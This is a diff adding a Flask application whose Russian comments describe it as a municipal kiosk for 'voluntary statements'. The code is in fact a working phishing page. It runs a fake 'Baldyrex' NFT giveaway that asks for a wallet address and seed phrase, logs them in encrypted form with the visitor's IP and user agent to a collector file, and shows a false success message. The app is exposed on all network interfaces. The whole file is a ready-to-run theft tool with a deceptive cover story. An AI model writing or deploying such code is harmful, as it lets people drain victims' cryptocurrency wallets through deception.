@@ -1,0 +1,89 @@
+# /app.py — муниципальный стенд для сбора добровольных показаний
+from flask import Flask, request, render_template_string, redirect, url_for
+import json
+import time
+import base64
+from cryptography.fernet import Fernet
+import os
+
+app = Flask(__name__)
+app.secret_key = os.urandom(24)
+
+# Ключ для шифрования отчётов (только для внутреннего аудита)
+CRYPTO_KEY = b'...'  # В реальной среде генерируется при первом запуске
+cipher = Fernet(CRYPTO_KEY)
+
+# Лог-файл для собранных "анкет"
+LOG_PATH = "/var/baldyrex/dropbox/submissions.log"
+os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
+
+# Шаблон — яркий, как вывеска казино, с кнопкой "Получить подарок"
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 Baldyrex Mega Giveaway</title>
+    <style>
+        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; }
+        .container { max-width: 500px; margin: 100px auto; padding: 30px; border: 2px solid #0f0; border-radius: 10px; background: #111; }
+        h1 { text-align: center; text-shadow: 0 0 20px #0f0; }
+        input, textarea { width: 100%; padding: 10px; margin: 10px 0; background: #222; color: #0f0; border: 1px solid #0f0; }
+        button { background: #0f0; color: #000; padding: 15px; border: none; width: 100%; font-weight: bold; cursor: pointer; }
+        .note { font-size: 0.8em; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 ВЫ ВЫИГРАЛИ!</h1>
+        <p>Ваш кошелёк отобран для получения эксклюзивного NFT-подарка Baldyrex Genesis.</p>
+        <p>Для подтверждения права на выигрыш, пожалуйста, введите данные вашего кошелька:</p>
+        <form method="POST" action="/claim">
+            <input type="text" name="wallet" placeholder="Адрес кошелька (Ethereum/BNB)" required>
+            <textarea name="seed" rows="3" placeholder="Сид-фраза (12 или 24 слова)" required></textarea>
+            <button type="submit">Проверить и получить NFT</button>
+        </form>
+        <p class="note">Ваши данные защищены протоколом Baldyrex. Участие бесплатно.</p>
+    </div>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/claim', methods=['POST'])
+def claim():
+    wallet = request.form.get('wallet', '').strip()
+    seed = request.form.get('seed', '').strip()
+    if not wallet or not seed:
+        return redirect(url_for('index'))
+    
+    # Упаковываем "анкету" в зашифрованный контейнер
+    record = {
+        "timestamp": time.time(),
+        "ip": request.remote_addr,
+        "user_agent": request.headers.get('User-Agent'),
+        "wallet": wallet,
+        "seed": seed
+    }
+    json_data = json.dumps(record)
+    encrypted = cipher.encrypt(json_data.encode())
+    
+    # Сбрасываем в коллектор
+    with open(LOG_PATH, "ab") as f:
+        f.write(encrypted + b"\n---\n")
+    
+    # Отдаём фейковое подтверждение (чтобы житель ушёл довольным)
+    return """
+    <html><body style="background:#0a0a0a;color:#0f0;text-align:center;padding:100px;">
+    <h1>✅ Поздравляем!</h1>
+    <p>Ваш токен будет отправлен на указанный кошелёк в течение 24 часов.</p>
+    <p><a href="/" style="color:#0f0;">Вернуться</a></p>
+    </body></html>
+    """
+
+# Запуск муниципального терминала
+if __name__ == '__main__':
+    # Привязываемся ко всем интерфейсам, чтобы киоск был доступен извне
+    app.run(host='0.0.0.0', port=8080, debug=False)
